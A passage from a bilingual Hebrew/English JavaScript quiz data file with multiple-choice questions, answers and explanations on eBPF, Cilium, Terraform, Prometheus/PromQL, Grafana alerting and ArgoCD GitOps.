      explanationEn: "eBPF Verifier checks: 1) No unbounded loops — program must terminate, 2) No out-of-bounds memory access, 3) No uninitialized reads, 4) Valid return codes.\n\nMain Points:\n- Only after successful verification does the kernel run the bytecode (JIT compiled)\n- This is the key feature enabling safe code execution in the kernel",
      qEn: "What does the eBPF Verifier ensure before a program runs in the kernel?",
      correctEn: "The program will not crash, will not run forever, and will not access unauthorized memory",
      choicesEn: [
        "The program will not crash, will not run forever, and will not access unauthorized memory",
        "The program is very fast",
        "The program is encrypted",
        "The program works with all Linux versions"
      ]
    },
    {
      q: "מה XDP_DROP עושה לחבילה ב-eBPF?",
      correct: "זורק את החבילה לפני שהיא מגיעה ל-kernel network stack — אפקטיבי לDDoS mitigation",
      choices: [
        "זורק את החבילה לפני שהיא מגיעה ל-kernel network stack — אפקטיבי לDDoS mitigation",
        "מפנה את החבילה לinterface אחר",
        "שולח את החבילה בחזרה ל-sender",
        "מוסיף את החבילה לqueue לעיבוד איטי"
      ],
      explanation: "‏XDP (eXpress Data Path) פועל ב־NIC driver level, לפני ה-kernel network stack.\n\nעיקרי:\n- XDP_DROP = drop מיידי, אפס overhead של kernel\n- XDP_PASS = עובר ל-kernel רגיל\n- XDP_TX = שולח בחזרה (hairpin)",
      explanationEn: "XDP (eXpress Data Path) operates at NIC driver level, before the kernel network stack.\n\nMain Points:\n- XDP_DROP = immediate drop, zero kernel overhead\n- XDP_PASS = passes to normal kernel\n- XDP_TX = sends back (hairpin)",
      qEn: "What does XDP_DROP do to a packet in eBPF?",
      correctEn: "Drops the packet before it reaches the kernel network stack — effective for DDoS mitigation",
      choicesEn: [
        "Drops the packet before it reaches the kernel network stack — effective for DDoS mitigation",
        "Redirects the packet to another interface",
        "Sends the packet back to the sender",
        "Adds the packet to a queue for slow processing"
      ]
    },
    {
      q: "מה היתרון של Cilium על iptables בKubernetes?",
      correct: "‏eBPF maps = O(1) lookup לעומת iptables = O(n) בkubernetes עם אלפי rules",
      choices: [
        "‏eBPF maps = O(1) lookup לעומת iptables = O(n) בkubernetes עם אלפי rules",
        "‏Cilium תומך ב־IPv4, iptables רק IPv6",
        "‏iptables לא עובד ב-containers",
        "‏Cilium מהיר כי כותב ב־Go"
      ],
      explanation: "‏Kubernetes עם 1000 services = iptables עם אלפי rules = כל packet עובר O(n) חיפוש ליניארי.\n\nעיקרי:\n- Cilium מחליף iptables בeBPF hash maps = O(1) בכל גודל\n- בנוסף: Cilium/Hubble מספקים observability מלאה (pod → pod traffic), security policies ברמת L7, וביצועים שלא תאמין",
      explanationEn: "Kubernetes with 1000 services = iptables with thousands of rules = every packet goes through O(n) linear search.\n\nMain Points:\n- Cilium replaces iptables with eBPF hash maps = O(1) at any size\n- Additionally: Cilium/Hubble provides full observability (pod to pod traffic), L7 security policies, and incredible performance",
      qEn: "What is the advantage of Cilium over iptables in Kubernetes?",
      correctEn: "eBPF maps = O(1) lookup vs iptables = O(n) in Kubernetes with thousands of rules",
      choicesEn: [
        "eBPF maps = O(1) lookup vs iptables = O(n) in Kubernetes with thousands of rules",
        "Cilium supports IPv4, iptables only IPv6",
        "iptables does not work in containers",
        "Cilium is fast because it is written in Go"
      ]
    },
    {
      q: "מה eBPF map ואיזה types נפוצים?",
      correct: "מבנה נתונים shared בין eBPF programs לבין kernel/userspace — types: BPF_MAP_TYPE_HASH, ARRAY, RINGBUF, PERF_EVENT_ARRAY",
      choices: [
        "מבנה נתונים shared בין eBPF programs לבין kernel/userspace — types: BPF_MAP_TYPE_HASH, ARRAY, RINGBUF, PERF_EVENT_ARRAY",
        "‏eBPF map = מיפוי kernel addresses לvirtual addresses",
        "רשימה של eBPF programs שloaded ב-kernel",
        "‏eBPF map = file במערכת קבצים /sys/fs/bpf"
      ],
      explanation: "‏eBPF maps: IPC mechanism בין eBPF programs לuser-space tools.\n\nעיקרי:\n- HASH_MAP: key-value store\n- ARRAY: fixed-size indexed\n- LRU_HASH: evicts least recently used",
      explanationEn: "eBPF maps: IPC mechanism between eBPF programs and user-space tools.\n\nMain Points:\n- HASH_MAP: key-value store\n- ARRAY: fixed-size indexed\n- LRU_HASH: evicts least recently used",
      qEn: "What is an eBPF map and what are common types?",
      correctEn: "A shared data structure between eBPF programs and kernel/userspace — types: BPF_MAP_TYPE_HASH, ARRAY, RINGBUF, PERF_EVENT_ARRAY",
      choicesEn: [
        "A shared data structure between eBPF programs and kernel/userspace — types: BPF_MAP_TYPE_HASH, ARRAY, RINGBUF, PERF_EVENT_ARRAY",
        "eBPF map = mapping kernel addresses to virtual addresses",
        "A list of eBPF programs loaded in the kernel",
        "eBPF map = a file in /sys/fs/bpf filesystem"
      ]
    },
    {
      q: "מה ההבדל בין eBPF tracepoints לבין kprobes?",
      correct: "‏Tracepoints: hook points סטטיים מוגדרים ב-kernel code (stable ABI) — kprobes: attach לכל kernel function address ‎(דינמי, עלול להשתנות בין kernel versions)‎",
      choices: [
        "‏Tracepoints: hook points סטטיים מוגדרים ב-kernel code (stable ABI) — kprobes: attach לכל kernel function address ‎(דינמי, עלול להשתנות בין kernel versions)‎",
        "‏kprobes מהירים יותר — tracepoints מאובטחים יותר",
        "‏Tracepoints לuserspace — kprobes לkernel בלבד",
        "אין הבדל מעשי — שניהם attach לאותם מקומות"
      ],
      explanation: "‏Tracepoints (sys_enter/sys_exit, net:netif_rx, sched:sched_switch): מוגדרים בmacro TRACE_EVENT בkernel source.\n\nעיקרי:\n- Stable: נשמרים בין kernel versions\n- uprobes: כמו kprobes אבל לuserspace functions\n- Perf events: hardware counters (CPU cycles, cache misses)",
      explanationEn: "Tracepoints (sys_enter/sys_exit, net:netif_rx, sched:sched_switch): defined with TRACE_EVENT macro in kernel source.\n\nMain Points:\n- Stable: preserved between kernel versions\n- uprobes: like kprobes but for userspace functions\n- Perf events: hardware counters (CPU cycles, cache misses)",
      qEn: "What is the difference between eBPF tracepoints and kprobes?",
      correctEn: "Tracepoints: static hook points defined in kernel code (stable ABI) — kprobes: attach to any kernel function address (dynamic, may change between kernel versions)",
      choicesEn: [
        "Tracepoints: static hook points defined in kernel code (stable ABI) — kprobes: attach to any kernel function address (dynamic, may change between kernel versions)",
        "kprobes are faster — tracepoints are more secure",
        "Tracepoints for userspace — kprobes for kernel only",
        "No practical difference — both attach to the same places"
      ]
    },
    {
      q: "מה Cilium ואיך משתמש ב-eBPF לCNI?",
      correct: "‏CNI plugin שמחליף iptables ב-eBPF — O(1) policy lookup במקום O(n) iptables rules, L7 visibility, Hubble observability",
      choices: [
        "‏CNI plugin שמחליף iptables ב-eBPF — O(1) policy lookup במקום O(n) iptables rules, L7 visibility, Hubble observability",
        "‏Cilium = Calico מבוסס eBPF — אותו vendor",
        "‏Cilium עובד רק עם kernel 6.0+",
        "‏Cilium = service mesh המחליף Istio"
      ],
      explanation: "‏Cilium eBPF CNI: kube-proxy replacement (eBPF LB במקום iptables), Network Policies (L3/L4/L7), transparent encryption (WireGuard), Hubble (observability — flow visibility per pod, DNS, HTTP).\n\nעיקרי:\n- iptables bottleneck: 10,000 services = 10,000 rules, linear scan\n- eBPF hash maps: O(1)\n- Cilium בBenchmark: 20-40% better throughput vs kube-proxy",
      explanationEn: "Cilium eBPF CNI: kube-proxy replacement (eBPF LB instead of iptables), Network Policies (L3/L4/L7), transparent encryption (WireGuard), Hubble (observability — flow visibility per pod, DNS, HTTP).\n\nMain Points:\n- iptables bottleneck: 10,000 services = 10,000 rules, linear scan\n- eBPF hash maps: O(1)\n- Cilium benchmark: 20-40% better throughput vs kube-proxy",
      qEn: "What is Cilium and how does it use eBPF for CNI?",
      correctEn: "CNI plugin that replaces iptables with eBPF — O(1) policy lookup instead of O(n) iptables rules, L7 visibility, Hubble observability",
      choicesEn: [
        "CNI plugin that replaces iptables with eBPF — O(1) policy lookup instead of O(n) iptables rules, L7 visibility, Hubble observability",
        "Cilium = Calico based on eBPF — same vendor",
        "Cilium only works with kernel 6.0+",
        "Cilium = service mesh replacing Istio"
      ]
    }
  ],

  207: [
    {
      q: "\u200Fמה ההבדל בין Terraform apply לבין Terraform plan?",
      correct: "\u200Fplan מציג מה ישתנה (dry run)\napply מבצע את השינויים בפועל",
      choices: [
        "\u200Fplan מציג מה ישתנה (dry run)\napply מבצע את השינויים בפועל",
        "\u200Fplan יוצר resources, apply מוחק אותם",
        "\u200Fשניהם מבצעים שינויים, ההבדל הוא מהירות בלבד",
        "\u200Fplan עובד ב־AWS בלבד, apply עובד בכל cloud"
      ],
      explanation: "‏‏ terraform plan\n\nעיקרי:\n- dry run שמחשב את ה-diff\n- בין ה־HCL לבין ה-state הנוכחי\n- מציג מה ייצור/ישנה/ימחק\n\nטיפ:\nלפני apply בפרודקשן",
      explanationEn: "terraform plan: dry run that calculates the diff between HCL and current state.\n\nMain Points:\n- Shows what will be created/changed/deleted\n- terraform apply: executes those changes\n- Best practice: always run plan and review output before apply in production",
      qEn: "What is the difference between Terraform apply and Terraform plan?",
      correctEn: "plan shows what will change (dry run)\napply makes the changes for real",
      choicesEn: [
        "plan shows what will change (dry run)\napply makes the changes for real",
        "plan creates resources, apply deletes them",
        "Both make changes, the difference is speed only",
        "plan works with AWS only, apply works with all clouds"
      ]
    },
    {
      q: "\u200Fמה זה Terraform State ולמה חשוב לשמור אותו ב־S3?",
      correct: "\u200FState הוא המיפוי בין HCL ל-resources אמיתיים\nב־S3 כדי שהצוות כולו ישתמש באותו state",
      choices: [
        "\u200FState הוא המיפוי בין HCL ל-resources אמיתיים\nב־S3 כדי שהצוות כולו ישתמש באותו state",
        "\u200FState הוא הגדרות ה-provider — ב־S3 ל-backup בלבד",
        "\u200FState שומר את קוד ה־HCL המקומפל",
        "\u200FState רלוונטי רק ל-multi-cloud deployments"
      ],
      explanation: "‏‏ State — הלב של Terraform\n\nעיקרי:\n- מפה מי יצר מה\n- בלי state, Terraform לא יודע מה קיים\n- S3 + DynamoDB\n\nטיפ:\nremote state = must בצוות",
      explanationEn: "State is the heart of Terraform — maps who created what.\n\nMain Points:\n- Without state, Terraform doesn't know what exists\n- S3 + DynamoDB: S3 stores the tfstate, DynamoDB provides locking to prevent two people running apply simultaneously (state corruption)\n- Remote state is a must for teams",
      qEn: "What is Terraform State and why store it in S3?",
      correctEn: "State is the mapping between HCL and real resources\nIn S3 so the whole team uses the same state",
      choicesEn: [
        "State is the mapping between HCL and real resources\nIn S3 so the whole team uses the same state",
        "State is the provider settings — in S3 for backup only",
        "State stores the compiled HCL code",
        "State is relevant only for multi-cloud deployments"
      ]
    },
    {
      q: "\u200Fמה ההבדל בין Cattle לבין Pets בהקשר של IaC?",
      correct: "\u200FPets = שרתים ייחודיים שמרפאים\nCattle = שרתים זהים שמחליפים\nIaC מעדיף Cattle",
      choices: [
        "\u200FPets = שרתים ייחודיים שמרפאים\nCattle = שרתים זהים שמחליפים\nIaC מעדיף Cattle",
        "\u200FCattle = שרתים גדולים (scale-up), Pets = שרתים קטנים",
        "\u200FPets = cloud, Cattle = on-premise",
        "\u200Fההבדל הוא בסוג ה־OS בלבד"
      ],
      explanation: "‏‏ Netflix הציגה את המטפורה ב־2012\n\nעיקרי:\n- Pets\n- dev-01, big-iron\n- לכל אחד שם, ייחודי, ידנית מוגדר\n\nטיפ:\nכדי לוודא ה-architecture Cattle-ready",
      explanationEn: "Netflix introduced this metaphor in 2012.\n\nMain Points:\n- Pets: dev-01, big-iron — each has a name, unique, manually configured\n- Cattle: web-047, numbered, identical, immutable\n- Terraform + Auto Scaling = Cattle",
      qEn: "What is the difference between Cattle and Pets in the context of IaC?",
      correctEn: "Pets = unique servers you heal\nCattle = identical servers you replace\nIaC prefers Cattle",
      choicesEn: [
        "Pets = unique servers you heal\nCattle = identical servers you replace\nIaC prefers Cattle",
        "Cattle = large servers (scale-up), Pets = small servers",
        "Pets = cloud, Cattle = on-premise",
        "The difference is in the OS type only"
      ]
    },
    {
      q: "\u200Fמה Terraform Module ולמה משתמשים בהם?",
      correct: "\u200Fקבצי .tf מקובצים ליחידה לוגית לשימוש חוזר\nמאפשרים DRY, encapsulation,\nversioning ו-sharing של infrastructure patterns",
      choices: [
        "\u200Fקבצי .tf מקובצים ליחידה לוגית לשימוש חוזר\nמאפשרים DRY, encapsulation,\nversioning ו-sharing של infrastructure patterns",
        "\u200FTerraform plugin שמוריד providers",
        "\u200Fממשק גרפי לניהול Terraform plans",
        "\u200FModule = workspace נפרד ב־Terraform Cloud"
      ],
      explanation: "‏‏ Module Structure\n\nעיקרי:\n- modules/vpc/main.tf + variables.tf + outputs.tf\n- Usage\n- module 'prod-vpc' { source = './modules/vpc' }\n\nטיפ:\nsame module ל-dev/staging/prod עם variables שונים",
      explanationEn: "Module Structure: modules/vpc/main.tf + variables.tf + outputs.tf.\n\nMain Points:\n- Usage: module 'prod-vpc' { source = './modules/vpc' }; cidr = '10.0.0.0/16'; azs = ['us-east-1a', 'us-east-1b']\n- Terraform Registry: hashicorp/vpc/aws — community-ready modules\n- version = '~> 5.0' for version pinning",
      qEn: "What is a Terraform Module and why use them?",
      correctEn: ".tf files grouped into a reusable logical unit\nEnabling DRY, encapsulation,\nversioning and sharing of infrastructure patterns",
      choicesEn: [
        ".tf files grouped into a reusable logical unit\nEnabling DRY, encapsulation,\nversioning and sharing of infrastructure patterns",
        "Terraform plugin that downloads providers",
        "GUI for managing Terraform plans",
        "Module = separate workspace in Terraform Cloud"
      ]
    }
  ],

  208: [
    {
      q: "\u200Fמה ההבדל בין RED method לבין USE method ב-monitoring?",
      correct: "\u200FRED (Rate/Errors/Duration) למדידת services\nUSE (Utilization/Saturation/Errors) למדידת resources",
      choices: [
        "\u200FRED (Rate/Errors/Duration) למדידת services\nUSE (Utilization/Saturation/Errors) למדידת resources",
        "\u200FRED ל-backend, USE ל-frontend",
        "\u200FUSE ל־Kubernetes, RED ל־VM",
        "\u200Fשניהם מדדים זהים עם שמות שונים"
      ],
      explanation: "‏‏ RED שואל\n\nעיקרי:\n- כמה requests לשנייה?\n- כמה נכשלים?\n- כמה זמן לוקח?\n\nטיפ:\nBrendan Gregg (Netflix) פיתח את USE method",
      explanationEn: "RED asks: How many requests per second.\n\nMain Points:\n- How many fail\n- How long do they take\n- Suitable for microservices and APIs",
      qEn: "What is the difference between RED method and USE method in monitoring?",
      correctEn: "RED (Rate/Errors/Duration) for measuring services\nUSE (Utilization/Saturation/Errors) for measuring resources",
      choicesEn: [
        "RED (Rate/Errors/Duration) for measuring services\nUSE (Utilization/Saturation/Errors) for measuring resources",
        "RED for backend, USE for frontend",
        "USE for Kubernetes, RED for VM",
        "Both are the same metrics with different names"
      ]
    },
    {
      q: "\u200Fמה עושה הפקודה histogram_quantile(0.99, ...) ב־PromQL?",
      correct: "\u200Fמחשבת את ה-percentile ה-99 של ה-latency\nה-latency שמתחתיו 99% מה-requests",
      choices: [
        "\u200Fמחשבת את ה-percentile ה-99 של ה-latency\nה-latency שמתחתיו 99% מה-requests",
        "\u200Fמחשבת ממוצע של 99 הנקודות האחרונות",
        "\u200Fמציגה את 99% מה-metrics ללא ה-outliers",
        "\u200Fמגדירה alert אם ה-latency עולה על 99ms"
      ],
      explanation: "‏‏ P99 Latency\n\nעיקרי:\n- histogram_quantile(0.99, rate(http_request_duration_seconds_bucket[5m]))\n- פירוש: 99% מה-requests הסתיימו בזמן הזה או פחות\n- ה-1% הגרועים ביותר = הזנב\n\nטיפ:\nrate() קודם על ה-bucket = חשוב לחישוב נכון",
      explanationEn: "P99 Latency: histogram_quantile(0.99, rate(http_request_duration_seconds_bucket[5m])).\n\nMain Points:\n- Meaning: 99% of requests completed in this time or less\n- The worst 1% = the tail\n- Why P99",
      qEn: "What does the command histogram_quantile(0.99, ...) do in PromQL?",
      correctEn: "Calculates the 99th percentile of latency\nThe latency below which 99% of requests fall",
      choicesEn: [
        "Calculates the 99th percentile of latency\nThe latency below which 99% of requests fall",
        "Calculates the average of the last 99 data points",
        "Shows 99% of metrics without outliers",
        "Sets an alert if latency goes above 99ms"
      ]
    },
    {
      q: "\u200Fמה ה-pull model של Prometheus לעומת push model?",
      correct: "\u200FPrometheus scrapes metrics מ-services בעצמו (pull)\nלעומת Graphite/StatsD ש-services דוחפים אליהם (push)",
      choices: [
        "\u200FPrometheus scrapes metrics מ-services בעצמו (pull)\nלעומת Graphite/StatsD ש-services דוחפים אליהם (push)",
        "\u200Fpull = real-time, push = batch",
        "\u200Fpull מהיר יותר כי לא צריך network",
        "\u200Fpush model אבטחתי יותר"
      ],
      explanation: "‏‏ Prometheus pull\n\nעיקרי:\n- מגדיר scrape_configs עם targets\n- Prometheus שולח GET /metrics כל 15s\n- יתרון\n\nטיפ:\nPushgateway קיים ל-jobs קצרים שלא חיים מספיק ל-scrape",
      explanationEn: "Prometheus pull: configures scrape_configs with targets.\n\nMain Points:\n- Prometheus sends GET /metrics every 15s\n- Advantage: Prometheus controls who is scraped\n- Easy healthcheck (if scrape fails = service down)",
      qEn: "What is the pull model of Prometheus vs push model?",
      correctEn: "Prometheus scrapes metrics from services itself (pull)\nvs Graphite/StatsD where services push to them (push)",
      choicesEn: [
        "Prometheus scrapes metrics from services itself (pull)\nvs Graphite/StatsD where services push to them (push)",
        "pull = real-time, push = batch",
        "pull is faster because it needs no network",
        "push model is more secure"
      ]
    },
    {
      q: "\u200Fמה PromQL query שמחשב request rate ב־5 דקות האחרונות?",
      correct: "\u200Frate(http_requests_total[5m])\nמחשב שיעור שינוי per-second של counter\nבחלון זמן של 5 דקות",
      choices: [
        "\u200Frate(http_requests_total[5m])\nמחשב שיעור שינוי per-second של counter\nבחלון זמן של 5 דקות",
        "\u200Favg(http_requests_total, 5m)",
        "\u200Fcount(http_requests[5m])",
        "\u200Fsum(requests) over 5m"
      ],
      explanation: "‏‏ rate() vs irate()\n\nעיקרי:\n- rate([5m]) = average rate over window (stable, ל-alerts)\n- irate([5m]) = instant rate (2 last samples, volatile, ל-graphs)\n- פונקציות נוספות\n\nטיפ:\nהחוק: רק rate() על counters (לא gauges)",
      explanationEn: "rate() vs irate(): rate([5m]) = average rate over window (stable, for alerts).\n\nMain Points:\n- irate([5m]) = instant rate (2 last samples, volatile, for graphs)\n- Additional functions: increase(counter[1h]) = absolute increase in an hour\n- sum(rate(http_requests_total[5m])) by (status_code) for breakdown",
      qEn: "What PromQL query calculates request rate in the last 5 minutes?",
      correctEn: "rate(http_requests_total[5m])\nCalculates per-second change rate of a counter\nin a 5-minute time window",
      choicesEn: [
        "rate(http_requests_total[5m])\nCalculates per-second change rate of a counter\nin a 5-minute time window",
        "avg(http_requests_total, 5m)",
        "count(http_requests[5m])",
        "sum(requests) over 5m"
      ]
    },
    {
      q: "\u200Fמה RED Method ב־SRE ומה מדדים בודקים?",
      correct: "\u200FRate (בקשות/שנייה)\nErrors (שיעור שגיאות)\nDuration (latency)\nשלושת המדדים הבסיסיים לבריאות שירות",
      choices: [
        "\u200FRate (בקשות/שנייה)\nErrors (שיעור שגיאות)\nDuration (latency)\nשלושת המדדים הבסיסיים לבריאות שירות",
        "\u200FReliability, Efficiency, Durability",
        "\u200FRequests, Errors, Downtime",
        "\u200FResponse time, Error budget, Deployment frequency"
      ],
      explanation: "‏‏ RED Method (Tom Wilkie, Weave Works)\n\nעיקרי:\n- Rate = rate(requests_total[1m])\n- Error = rate(requests_total{status='error'}[1m]) / rate(requests_total[1m])\n- Duration = histogram_quantile(0.95, rate(request_duration_bucket[1m]))\n\nטיפ:\nGolden Signals (Google SRE Book): Latency, Traffic, Errors, Saturation",
      explanationEn: "RED Method (Tom Wilkie, Weave Works): Rate = rate(requests_total[1m]), Error = rate(requests_total{status='error'}[1m]) / rate(requests_total[1m]), Duration = histogram_quantile(0.95, rate(request_duration_bucket[1m])).\n\nMain Points:\n- USE Method (Brendan Gregg): Utilization (CPU%), Saturation (queue depth), Errors\n- Comparison: RED = user perspective, USE = resource perspective\n- Golden Signals (Google SRE Book): Latency, Traffic, Errors, Saturation",
      qEn: "What is the RED Method in SRE and what metrics are checked?",
      correctEn: "Rate (requests/second)\nErrors (error rate)\nDuration (latency)\nThe three basic metrics for service health",
      choicesEn: [
        "Rate (requests/second)\nErrors (error rate)\nDuration (latency)\nThe three basic metrics for service health",
        "Reliability, Efficiency, Durability",
        "Requests, Errors, Downtime",
        "Response time, Error budget, Deployment frequency"
      ]
    },
    {
      q: "\u200Fמה ההבדל בין Grafana Dashboard לבין Grafana Alert?",
      correct: "\u200FDashboard: ויזואליזציה של metrics לצפייה\nAlert: rule שמוערך periodically\nושולח notification כש-threshold מופר",
      choices: [
        "\u200FDashboard: ויזואליזציה של metrics לצפייה\nAlert: rule שמוערך periodically\nושולח notification כש-threshold מופר",
        "\u200FDashboard ל-prod — Alert ל-dev/staging",
        "\u200FAlert הוא dashboard מיוחד עם רקע אדום",
        "\u200FGrafana עושה רק visualization\nAlerting דרך Prometheus בלבד"
      ],
      explanation: "‏‏ Grafana Alerting (Unified Alerting)\n\nעיקרי:\n- Alert Rule → Evaluation Group (כל 1m)\n- → Contact Point (Slack/PagerDuty/Email)\n- → Notification Policy\n\nטיפ:\nRunbook URL: קישור ל-procedure לאחר alert",
      explanationEn: "Grafana Alerting (Unified Alerting): Alert Rule evaluated by Evaluation Group (every 1m), sent to Contact Point (Slack/PagerDuty/Email) via Notification Policy.\n\nMain Points:\n- Alert states: Normal, Pending (threshold breached but duration not met), Firing, No Data, Error\n- Example: avg_over_time(up[5m]) < 0.5 (service down >50% in 5 minutes)\n- Alertmanager: deduplication, grouping, routing, silencing",
      qEn: "What is the difference between Grafana Dashboard and Grafana Alert?",
      correctEn: "Dashboard: visualization of metrics for viewing\nAlert: rule evaluated periodically\nthat sends notification when threshold is breached",
      choicesEn: [
        "Dashboard: visualization of metrics for viewing\nAlert: rule evaluated periodically\nthat sends notification when threshold is breached",
        "Dashboard for prod — Alert for dev/staging",
        "Alert is a special dashboard with red background",
        "Grafana only does visualization\nAlerting only through Prometheus"
      ]
    }
  ],

  209: [
    {
      q: "מה drift detection ב־ArgoCD?",
      correct: "זיהוי הבדל בין state ב־Git לבין state הפועל בcluster — ArgoCD מתקן אוטומטית אם selfHeal מופעל",
      choices: [
        "זיהוי הבדל בין state ב־Git לבין state הפועל בcluster — ArgoCD מתקן אוטומטית אם selfHeal מופעל",
        "ניטור של שינויי network בין pods",
        "גילוי configuration drift בין staging לproduction",
        "בדיקה שה־Git repo לא נמחק"
      ],
      explanation: "‏Drift = מישהו עשה kubectl edit/patch ישירות על cluster מחוץ לGit.\n\nעיקרי:\n- ArgoCD מזהה את ה-diff ומציג status=OutOfSync\n- עם syncPolicy.automated.selfHeal=true — ArgoCD מחזיר לstate ב־Git אוטומטית תוך דקות\n- זה הלב של GitOps: Git הוא מקור האמת היחיד",
      explanationEn: "Drift = someone did kubectl edit/patch directly on cluster outside of Git.\n\nMain Points:\n- ArgoCD detects the diff and shows status=OutOfSync\n- With syncPolicy.automated.selfHeal=true, ArgoCD reverts to the Git state automatically within minutes\n- This is the heart of GitOps: Git is the single source of truth",
      qEn: "What is drift detection in ArgoCD?",
      correctEn: "Detecting a difference between Git state and running state in the cluster — ArgoCD fixes it automatically if selfHeal is enabled",
      choicesEn: [
        "Detecting a difference between Git state and running state in the cluster — ArgoCD fixes it automatically if selfHeal is enabled",
        "Monitoring network changes between pods",
        "Discovering configuration drift between staging and production",
        "Checking that the Git repo was not deleted"
      ]
    },
    {
      q: "מדוע GitOps pull model בטוח יותר מ-push deployment?",
      correct: "בpull model, רק ה-controller בcluster צריך cluster access — ה־CI pipeline לא צריך kubectl credentials",
      choices: [
        "בpull model, רק ה-controller בcluster צריך cluster access — ה־CI pipeline לא צריך kubectl credentials",
        "‏pull model מהיר יותר כי אין network latency",
        "‏push model לא עובד עם Kubernetes",
        "‏pull model מצפין את הmanifests אוטומטית"
      ],
      explanation: "‏בpush deployment: ל־CI pipeline (GitHub Actions, Jenkins) יש kubeconfig עם cluster admin — זה attack surface ענקי.\n\nעיקרי:\n- אם CI נפרץ = cluster נפרץ\n- בGitOps pull: ArgoCD רץ בתוך ה-cluster, מסתכל על Git מבפנים\n- שום entity חיצוני לא צריך cluster credentials",
      explanationEn: "In push deployment: CI pipeline (GitHub Actions, Jenkins) has kubeconfig with cluster admin — huge attack surface.\n\nMain Points:\n- If CI is breached = cluster is breached\n- In GitOps pull: ArgoCD runs inside the cluster, watches Git from within\n- No external entity needs cluster credentials",
      qEn: "Why is GitOps pull model safer than push deployment?",
      correctEn: "In pull model, only the controller in the cluster needs cluster access — the CI pipeline does not need kubectl credentials",
      choicesEn: [
        "In pull model, only the controller in the cluster needs cluster access — the CI pipeline does not need kubectl credentials",
        "Pull model is faster because there is no network latency",
        "Push model does not work with Kubernetes",
        "Pull model encrypts manifests automatically"
      ]
    },
    {
      q: "מה הפתרון המועדף לניהול secrets ב־GitOps?",
      correct: "‏Sealed Secrets ‎(מוצפן בpublic key)‎ או External Secrets Operator ‎(מושך מ־Vault/AWS)‎ — לא מאחסנים plaintext בGit",
      choices: [
        "‏Sealed Secrets ‎(מוצפן בpublic key)‎ או External Secrets Operator ‎(מושך מ־Vault/AWS)‎ — לא מאחסנים plaintext בGit",
        "מאחסנים secrets ב־Git עם הרשאות read-only בלבד",
        "מצפינים secrets בbase64 לפני push לGit",
        "‏ArgoCD מנהל secrets אוטומטית ללא כלים נוספים"
      ],
      explanation: "‏base64 הוא לא הצפנה.\n\nעיקרי:\n- Sealed Secrets: kubeseal מצפין עם public key של ה-cluster — רק ה-cluster יכול לפענח, בטוח לsave בGit\n- External Secrets: רץ בcluster, מושך מ־Vault/AWS Secrets Manager/GCP Secret Manager, יוצר Kubernetes Secret מקומי\n- שניהם פתרונות לגיטימיים",
      explanationEn: "base64 is NOT encryption.\n\nMain Points:\n- Sealed Secrets: kubeseal encrypts with the cluster's public key — only the cluster can decrypt, safe to store in Git\n- External Secrets: runs in cluster, pulls from Vault/AWS Secrets Manager/GCP Secret Manager, creates local Kubernetes Secret\n- Both are legitimate solutions",
      qEn: "What is the preferred solution for managing secrets in GitOps?",
      correctEn: "Sealed Secrets (encrypted with public key) or External Secrets Operator (pulls from Vault/AWS) — do not store plaintext in Git",
      choicesEn: [
        "Sealed Secrets (encrypted with public key) or External Secrets Operator (pulls from Vault/AWS) — do not store plaintext in Git",
        "Store secrets in Git with read-only permissions only",
        "Encrypt secrets in base64 before pushing to Git",
        "ArgoCD manages secrets automatically without extra tools"
      ]
    },
        {
      q: "מה ArgoCD Application manifest ומה syncPolicy.automated?",
      correct: "‏Application CRD שמגדיר source (Git repo + path), destination (cluster + namespace), ו-syncPolicy — automated = ArgoCD sync אוטומטי עם כל שינוי ב־Git",
      choices: [
        "‏Application CRD שמגדיר source (Git repo + path), destination (cluster + namespace), ו-syncPolicy — automated = ArgoCD sync אוטומטי עם כל שינוי ב־Git",
        "‏Kubernetes Deployment שמריץ ArgoCD server",
        "‏Helm chart מיוחד לdeploy applications",
        "‏CI/CD pipeline YAML ב-.github/workflows/"
      ],
      explanation: "‏Application manifest: apiVersion: argoproj.io/v1alpha1; kind: Application; spec.source: repoURL + path + targetRevision (branch/tag/commit); spec.destination: server (cluster API URL) + namespace; syncPolicy.automated: prune: true (מוחק resources שנמחקו מGit), selfHeal: true (תוקן אם מישהו שינה ישירות בcluster).\n\nעיקרי:\n- ArgoCD poll Git כל 3 דקות ברירת מחדל, webhook = מיידי\n- App of Apps pattern: Application שמנהלת Applications אחרות",
      explanationEn: "Application manifest: apiVersion: argoproj.io/v1alpha1; kind: Application; spec.source: repoURL + path + targetRevision (branch/tag/commit); spec.destination: server (cluster API URL) + namespace; syncPolicy.automated: prune: true (deletes resources removed from Git), selfHeal: true (fixes direct cluster changes).\n\nMain Points:\n- ArgoCD polls Git every 3 minutes by default, webhook for immediate sync\n- App of Apps pattern: Application managing other Applications",
      qEn: "What is an ArgoCD Application manifest and what is syncPolicy.automated?",
      correctEn: "Application CRD that defines source (Git repo + path), destination (cluster + namespace), and syncPolicy — automated = ArgoCD syncs automatically with every Git change",
      choicesEn: [
        "Application CRD that defines source (Git repo + path), destination (cluster + namespace), and syncPolicy — automated = ArgoCD syncs automatically with every Git change",
        "Kubernetes Deployment that runs ArgoCD server",
        "Special Helm chart to deploy applications",
        "CI/CD pipeline YAML in .github/workflows/"
      ]
    },
        {
      q: "מה ההבדל בין Argo Rollouts Progressive Delivery לבין Rolling Update רגיל?",
      correct: "‏Rolling Update מחליף pods בהדרגה ללא בקרה — Argo Rollouts מאפשר Canary ‎(% traffic לגרסה חדשה)‎ ו־Blue/Green עם analysis אוטומטי ו-rollback",
      choices: [
        "‏Rolling Update מחליף pods בהדרגה ללא בקרה — Argo Rollouts מאפשר Canary ‎(% traffic לגרסה חדשה)‎ ו־Blue/Green עם analysis אוטומטי ו-rollback",
        "‏Argo Rollouts = Argo CD עם תכונות נוספות בלבד",
        "‏Canary deployment = deploy לcanary server בלבד",
        "‏Progressive Delivery אפשרי רק עם Istio service mesh"
      ],
      explanation: "‏Rolling Update: maxSurge=1, maxUnavailable=0 → pods מוחלפים אחד-אחד, אין visibility לmetrics.\n\nעיקרי:\n- Argo Rollouts Canary: steps: setWeight 10% → pause 5m → analysis (error rate < 1%?) → setWeight 50% → analysis → setWeight 100%\n- אם analysis נכשל → automatic rollback\n- Blue/Green: שתי סביבות מלאות, traffic switch רגעי",
      explanationEn: "Rolling Update: replaces pods gradually without control — maxSurge=1, maxUnavailable=0, no metrics visibility.\n\nMain Points:\n- Argo Rollouts Canary: steps: setWeight 10%, pause 5m, analysis (error rate < 1%?), setWeight 50%, analysis, setWeight 100%\n- If analysis fails = automatic rollback\n- Blue/Green: two full environments, instant traffic switch",
      qEn: "What is the difference between Argo Rollouts Progressive Delivery and a regular Rolling Update?",
